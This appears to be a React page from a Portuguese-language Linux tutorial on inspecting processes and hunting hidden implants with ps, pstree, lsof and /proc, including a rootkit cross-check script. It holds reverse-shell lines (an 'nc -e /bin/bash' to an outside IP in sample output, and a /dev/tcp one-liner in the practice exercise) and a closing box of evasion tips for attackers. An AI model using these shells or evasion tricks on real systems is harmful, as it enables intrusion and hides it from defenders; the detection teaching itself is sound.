import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Processos() {
  return (
    <PageContainer
      title="Processos no Linux"
      subtitle="Listar, inspecionar, matar e caçar processos escondidos — fundação para detectar implants e rootkits."
      difficulty="iniciante"
      timeToRead="16 min"
    >
      <h2>Modelo de processo Unix</h2>
      <p>
        Cada processo no Linux tem um <strong>PID</strong> (process id), um <strong>PPID</strong> (parent),
        um <strong>UID</strong> (dono), prioridade, estado (R/S/D/Z/T) e uma entrada em <code>/proc/&lt;pid&gt;/</code>
        com tudo: linha de comando, descritores abertos, namespaces, cgroups, mapas de memória.
        Em pentest é onde você procura: implant rodando como nobody? PID escondido pelo
        rootkit? Conexão suspeita amarrada a qual binário? Tudo está em <code>/proc</code>.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "ps aux | head -8",
            out: `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.4 167284 12736 ?        Ss   08:42   0:02 /sbin/init splash
root           2  0.0  0.0      0     0 ?        S    08:42   0:00 [kthreadd]
root         412  0.0  0.1  23104  5984 ?        Ss   08:42   0:00 /lib/systemd/systemd-journald
root         781  0.0  0.2 314928  7424 ?        Ssl  08:42   0:00 /usr/sbin/NetworkManager --no-daemon
postgres     902  0.0  0.6 218904 18560 ?        Ss   08:42   0:01 /usr/lib/postgresql/16/bin/postgres -D /var/lib/postgresql/16/main
wallyson    1284  0.2  1.8 482004 58432 ?        Sl   08:43   0:09 /usr/bin/Xorg vt2 -nolisten tcp -auth /var/run/lightdm/root/:0
wallyson    2104  0.4  2.2 612928 71236 ?        Sl   08:43   0:18 /opt/google/chrome/chrome --type=renderer
nobody     14271  9.1  0.3  18432  9988 ?        S    14:11   0:42 /tmp/.x11-unix/.helper`,
            outType: "info",
          },
          {
            comment: "última linha SUSPEITA: nobody rodando binario em /tmp escondido em diretorio dot",
            cmd: "ls -la /proc/14271/exe",
            out: "lrwxrwxrwx 1 nobody nogroup 0 Apr 03 14:11 /proc/14271/exe -> /tmp/.x11-unix/.helper (deleted)",
            outType: "error",
          },
        ]}
      />

      <AlertBox type="danger" title="Pista clássica de implant: '(deleted)' no /proc/PID/exe">
        Quando o processo apaga o próprio binário do disco logo após executar (técnica
        antiforense), o kernel marca o link em <code>/proc/&lt;pid&gt;/exe</code> como
        <code>(deleted)</code>. Detectar isso é o primeiro passo de IR (incident response).
      </AlertBox>

      <h2>ps — formato e flags</h2>
      <CommandTable
        title="ps — combinações úteis"
        variations={[
          { cmd: "ps aux", desc: "Tudo, formato BSD (USER, PID, %CPU, %MEM, ...).", output: "Default no terminal de pentester." },
          { cmd: "ps -ef", desc: "Tudo, formato System V (UID, PID, PPID, C, STIME).", output: "Mostra PPID, ótimo pra árvore." },
          { cmd: "ps -eo pid,ppid,user,cmd --sort=-%cpu | head", desc: "Top consumo CPU em formato custom.", output: "PID  PPID USER     CMD\\n14271     1 nobody   ./helper" },
          { cmd: "ps -eo pid,etime,cmd --sort=-etime | head", desc: "Processos mais antigos primeiro (uptime do processo).", output: "Procurar implants persistentes." },
          { cmd: "ps -ef --forest", desc: "Árvore ASCII (PPID -> PID).", output: "Visualiza quem nasceu de quem." },
          { cmd: "ps -L -p 1284", desc: "Lista threads (LWP) de um processo.", output: "Útil em apps multithread." },
          { cmd: "ps -o pid,user,fname,nlwp -p $(pgrep -d, sshd)", desc: "Vários PIDs em uma chamada.", output: "Combina pgrep + ps." },
          { cmd: "ps -fU wallyson", desc: "Processos de um usuário.", output: "Bom pra segregar usuário comprometido." },
        ]}
      />

      <h2>pstree — a hierarquia</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "pstree -p | head -20",
            out: `systemd(1)─┬─NetworkManager(781)─┬─{NetworkManager}(782)
           │                     └─{NetworkManager}(783)
           ├─cron(812)
           ├─dbus-daemon(823)
           ├─lightdm(901)─┬─Xorg(1284)
           │             └─lightdm(932)─┬─xfce4-session(1051)─┬─xfce4-panel(1102)
           │                            │                     ├─xfce4-terminal(2031)─┬─bash(2032)─┬─curl(14299)
           │                            │                     │                       │           └─sh(14271)─┬─python3(14280)
           │                            │                     │                       │                       └─nc(14281)
           │                            │                     │                       └─pstree(14401)
           ├─sshd(951)
           ├─systemd-journald(412)
           └─NetworkManager(781)`,
            outType: "default",
          },
          {
            comment: "ATENÇÃO: nc(14281) descende de sh(14271) que descende de bash(2032). reverse shell viva!",
            cmd: "ls -l /proc/14281/exe; cat /proc/14281/cmdline | tr '\\0' ' '",
            out: `lrwxrwxrwx 1 wallyson wallyson 0 Apr 03 14:11 /proc/14281/exe -> /usr/bin/nc.openbsd
nc -e /bin/bash 10.10.14.5 4444`,
            outType: "error",
          },
        ]}
      />

      <h2>top e htop</h2>
      <p>
        <code>top</code> sempre disponível (até em shell limitado). <code>htop</code> tem cores,
        scroll horizontal, F5 (árvore), F6 (sort), F9 (kill). Em IR/forensics use <code>htop -t</code>
        (treeview) e <code>F4</code> para filtrar por nome.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "top -bn1 -o %CPU | head -12",
            out: `top - 14:23:11 up 5:41,  1 user,  load average: 0.42, 0.31, 0.28
Tasks: 248 total,   2 running, 246 sleeping,   0 stopped,   0 zombie
%Cpu(s):  4.2 us,  1.8 sy,  0.0 ni, 93.8 id,  0.1 wa,  0.0 hi,  0.1 si,  0.0 st
MiB Mem :   3922.4 total,    582.1 free,   1894.2 used,   1446.1 buff/cache
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1771.1 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
  14271 nobody    20   0   18432   9988    856 S   9.1   0.3   0:42.18 helper
   2104 wallyson  20   0  612928  71236  44128 S   4.2   1.8   0:18.41 chrome
   1284 wallyson  20   0  482004  58432  31200 S   2.0   1.5   0:09.12 Xorg
    902 postgres  20   0  218904  18560  17280 S   0.1   0.4   0:01.04 postgres
   2032 wallyson  20   0   12480   5120   3008 S   0.0   0.1   0:00.18 bash`,
            outType: "info",
          },
        ]}
      />

      <h2>Sinais e kill</h2>
      <CommandTable
        title="Sinais que você usa todo dia"
        variations={[
          { cmd: "kill -l", desc: "Lista todos os sinais.", output: "1) SIGHUP 2) SIGINT 3) SIGQUIT 9) SIGKILL 15) SIGTERM 19) SIGSTOP ..." },
          { cmd: "kill 14281", desc: "Manda SIGTERM (15) — pede pra sair limpo.", output: "Programa pode rodar handler/cleanup." },
          { cmd: "kill -9 14281", desc: "SIGKILL — kernel mata na hora, sem chance.", output: "Use só quando -15 não funcionar." },
          { cmd: "kill -HUP 951", desc: "SIGHUP (1) — clássico 'recarregar config' (sshd, nginx, etc).", output: "Reload sem dropar conexões." },
          { cmd: "kill -STOP 14281; kill -CONT 14281", desc: "Pausa e retoma processo.", output: "Útil pra freezar processo suspeito sem matar." },
          { cmd: "killall nc", desc: "Mata por nome (TODOS os 'nc').", output: "Cuidado — pode matar legítimo." },
          { cmd: "pkill -f 'python3 .*helper'", desc: "Mata por regex na linha de comando inteira.", output: "-f é essencial pra scripts." },
          { cmd: "pkill -u nobody", desc: "Mata todos os processos do usuário 'nobody'.", output: "Resposta a incidente: limpa um user." },
          { cmd: "pgrep -af helper", desc: "Lista PIDs (sem matar) com cmdline.", output: "14271 ./helper" },
        ]}
      />

      <h2>nice e renice — prioridade</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "rodar hashcat com prioridade BAIXA pra não congelar o desktop",
            cmd: "nice -n 19 hashcat -a 0 -m 1000 hashes.txt rockyou.txt",
            out: "(roda só quando ninguém mais quer CPU)",
            outType: "muted",
          },
          {
            comment: "subir prioridade de processo já rodando (precisa root pra nice negativo)",
            cmd: "sudo renice -n -10 -p 14271",
            out: "14271 (process ID) old priority 0, new priority -10",
            outType: "warning",
          },
          {
            comment: "ionice: prioridade de I/O (idle / best-effort / realtime)",
            cmd: "ionice -c 3 rsync -a /home/ /backup/",
            out: "(rsync rodando em idle I/O class — não atrapalha disco)",
            outType: "info",
          },
        ]}
      />

      <h2>fuser e lsof — quem está usando isto?</h2>
      <p>
        <strong>lsof</strong> = list open files. No Unix tudo é arquivo (sockets, pipes, devices),
        então ele responde quase tudo: quem abriu a porta 4444? quem segura o pendrive? qual
        processo deletou o binário mas mantém o handle aberto?
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "quem está escutando na porta 4444?",
            cmd: "sudo lsof -i :4444",
            out: `COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
nc      14281 nobody    3u  IPv4 198421      0t0  TCP kali:60112->10.10.14.5:4444 (ESTABLISHED)`,
            outType: "error",
          },
          {
            comment: "todos os arquivos abertos por um PID",
            cmd: "sudo lsof -p 14271 | head -8",
            out: `COMMAND   PID   USER   FD   TYPE DEVICE  SIZE/OFF    NODE NAME
helper  14271 nobody  cwd    DIR    8,1      4096   65601 /tmp/.x11-unix
helper  14271 nobody  rtd    DIR    8,1      4096       2 /
helper  14271 nobody  txt    REG    8,1     18248  198284 /tmp/.x11-unix/.helper (deleted)
helper  14271 nobody  mem    REG    8,1   2030928  131544 /usr/lib/x86_64-linux-gnu/libc.so.6
helper  14271 nobody    0u   CHR    1,3       0t0       6 /dev/null
helper  14271 nobody    1u  IPv4 198418       0t0     TCP *:4444 (LISTEN)
helper  14271 nobody    2u  IPv4 198419       0t0     TCP kali:60112->10.10.14.5:4444 (ESTABLISHED)
helper  14271 nobody    3w   REG    8,1     91342  198286 /tmp/.x11-unix/.log`,
            outType: "warning",
          },
          {
            comment: "binarios DELETADOS mas ainda em execução (técnica de evasão clássica)",
            cmd: "sudo lsof | grep '(deleted)' | head -3",
            out: `helper    14271 nobody  txt    REG    8,1   18248  198284 /tmp/.x11-unix/.helper (deleted)
gpg-agent  3201 wallyson 4u  REG    8,1     128  198901 /tmp/gpg-agent.NfQq3 (deleted)`,
            outType: "info",
          },
          {
            comment: "fuser: o que está usando este arquivo/diretorio (útil pra desmontar pendrive)",
            cmd: "fuser -v /media/usb",
            out: `                     USER        PID ACCESS COMMAND
/media/usb:          wallyson   15021 ..c..  bash
                     wallyson   15044 F....  vim`,
            outType: "default",
          },
        ]}
      />

      <h2>/proc/&lt;pid&gt;/ — a fonte de tudo</h2>
      <CommandTable
        title="Arquivos importantes em /proc/<pid>/"
        variations={[
          { cmd: "cmdline", desc: "Linha de comando completa, separada por NUL.", output: "cat /proc/14271/cmdline | tr '\\0' ' '" },
          { cmd: "exe", desc: "Symlink para o binário em execução.", output: "ls -l mostra (deleted) se foi removido." },
          { cmd: "cwd", desc: "Symlink para o diretório de trabalho atual.", output: "Onde o processo está 'rodando'." },
          { cmd: "environ", desc: "Variáveis de ambiente (NUL-separated).", output: "cat | tr '\\0' '\\n' — pode ter senhas!" },
          { cmd: "status", desc: "Estado humano-legível (UID, threads, capabilities).", output: "Procurar Uid: 0 inesperado." },
          { cmd: "fd/", desc: "Diretório com symlinks de cada FD aberto.", output: "ls -l /proc/14271/fd/" },
          { cmd: "maps", desc: "Mapeamento de memória (libs carregadas, stack, heap).", output: "Detectar shellcode injetado." },
          { cmd: "net/tcp", desc: "Tabela TCP do namespace de rede do processo.", output: "Útil pra ver sockets em containers." },
          { cmd: "ns/", desc: "Namespaces (mnt, net, pid, user, uts, ipc, cgroup).", output: "Comparar com /proc/1/ns/ — diferentes? está em container." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "extrair env de processo (pode achar credenciais)",
            cmd: "sudo cat /proc/14271/environ | tr '\\0' '\\n'",
            out: `PATH=/tmp/.x11-unix:/usr/bin
HOME=/tmp
SHELL=/bin/sh
C2_KEY=8a7c2f9d4e1b6a3c
C2_HOST=10.10.14.5`,
            outType: "error",
          },
          {
            comment: "ver se um processo está em container",
            cmd: "sudo readlink /proc/1/ns/pid /proc/14271/ns/pid",
            out: `pid:[4026531836]
pid:[4026532197]`,
            outType: "warning",
          },
        ]}
      />

      <h2>Caçando processos escondidos (rootkit detection)</h2>
      <p>
        Rootkits modernos (LD_PRELOAD, eBPF, kernel modules) hookam <code>readdir()</code> ou
        a <code>/proc</code> para esconder PIDs. Comparar contagens entre fontes diferentes
        revela inconsistências.
      </p>

      <CodeBlock
        language="bash"
        title="rootkit-cross-check.sh — comparar /proc com ps"
        code={`#!/usr/bin/env bash
# Lista PIDs reais em /proc e compara com o que ps reporta.
# Discrepância = candidato a processo escondido.

set -euo pipefail

echo "[*] PIDs em /proc:"
proc_pids=$(ls /proc | grep -E '^[0-9]+$' | sort -n)
echo "$proc_pids" | wc -l

echo "[*] PIDs reportados por ps:"
ps_pids=$(ps -eo pid= | tr -d ' ' | sort -n)
echo "$ps_pids" | wc -l

echo "[*] PIDs em /proc mas NÃO em ps (suspeitos):"
comm -23 <(echo "$proc_pids") <(echo "$ps_pids")

echo "[*] PIDs com binário deletado:"
for pid in $proc_pids; do
  exe=$(readlink "/proc/$pid/exe" 2>/dev/null || true)
  [[ "$exe" == *"(deleted)"* ]] && echo "  PID=$pid  exe=$exe"
done

echo "[*] Processos escutando portas com binario em /tmp ou /dev/shm:"
sudo lsof -i -nP 2>/dev/null | awk '/LISTEN/{print $2}' | sort -u | while read pid; do
  exe=$(readlink "/proc/$pid/exe" 2>/dev/null || true)
  [[ "$exe" == /tmp/* || "$exe" == /dev/shm/* ]] && echo "  PID=$pid  exe=$exe"
done`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo bash rootkit-cross-check.sh",
            out: `[*] PIDs em /proc:
247
[*] PIDs reportados por ps:
245
[*] PIDs em /proc mas NÃO em ps (suspeitos):
14271
14281
[*] PIDs com binário deletado:
  PID=14271  exe=/tmp/.x11-unix/.helper (deleted)
[*] Processos escutando portas com binario em /tmp ou /dev/shm:
  PID=14271  exe=/tmp/.x11-unix/.helper (deleted)`,
            outType: "error",
          },
        ]}
      />

      <h2>Estados de processo (campo STAT)</h2>
      <CommandTable
        title="O que cada letra significa"
        variations={[
          { cmd: "R", desc: "Running ou runnable.", output: "Está usando ou pronto pra usar CPU." },
          { cmd: "S", desc: "Sleeping interruptível (estado normal).", output: "Maioria dos processos." },
          { cmd: "D", desc: "Sleeping uninterruptível (geralmente I/O).", output: "Não dá pra matar nem com -9 enquanto disco/NFS travado." },
          { cmd: "Z", desc: "Zombie — terminou mas pai não fez wait().", output: "Pai com bug — mate o pai pra liberar." },
          { cmd: "T", desc: "Stopped (SIGSTOP/SIGTSTP).", output: "Ctrl+Z em foreground põe nesse estado." },
          { cmd: "<", desc: "High priority (nice negativo).", output: "Tem precedência." },
          { cmd: "N", desc: "Low priority (nice positivo).", output: "Cede CPU." },
          { cmd: "s", desc: "Session leader.", output: "Líder de sessão (shell login)." },
          { cmd: "+", desc: "Foreground process group.", output: "Está rodando em primeiro plano no TTY." },
          { cmd: "l", desc: "Multi-threaded (usa clone()).", output: "Veja com ps -L." },
        ]}
      />

      <PracticeBox
        title="Caçar e matar uma reverse shell"
        goal="Simular reverse shell, encontrar pelo /proc, identificar conexão e matar a árvore inteira."
        steps={[
          "Em um terminal, suba um listener: nc -lvnp 4444.",
          "Em outro terminal, dispare um 'reverse shell' simulada: bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &.",
          "Liste processos suspeitos via lsof na porta 4444.",
          "Pegue o PID, suba até o pai com pstree e mate a árvore inteira.",
        ]}
        command={`# 1) listener
nc -lvnp 4444 &

# 2) 'shell' chamando o listener
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &

# 3) achar PID
sudo lsof -i :4444 -sTCP:ESTABLISHED -nP

# 4) árvore + kill
PID=$(sudo lsof -i :4444 -sTCP:ESTABLISHED -t | head -1)
pstree -p $PID
kill -9 -$(ps -o pgid= $PID | tr -d ' ')`}
        expected={`COMMAND   PID  USER   FD   TYPE DEVICE  SIZE/OFF NODE NAME
bash    18392  wallyson  2u  IPv4 247103      0t0  TCP 127.0.0.1:48122->127.0.0.1:4444 (ESTABLISHED)

bash(18392)───bash(18393)
(processo morto, pgid inteiro encerrado)`}
        verify="Após o kill, lsof -i :4444 não deve listar nada. ps -p 18392 deve retornar 'no process found'."
      />

      <AlertBox type="warning" title="Em pentest: SEU implant é o 'processo escondido'">
        Se você está do lado ofensivo, lembre-se: tudo que descrevemos aqui (lsof, /proc, pstree, deleted exe)
        é exatamente o que o time defensivo vai rodar. Para evadir: rode com nome enganoso
        (<code>cp /tmp/.helper /tmp/[kworker/u8:2]</code>), use <code>setproctitle()</code>,
        prefira injection em processo legítimo (<em>process hollowing</em>) e nunca deixe binário
        em <code>/tmp</code>, <code>/dev/shm</code> ou <code>/var/tmp</code>.
      </AlertBox>
    </PageContainer>
  );
}
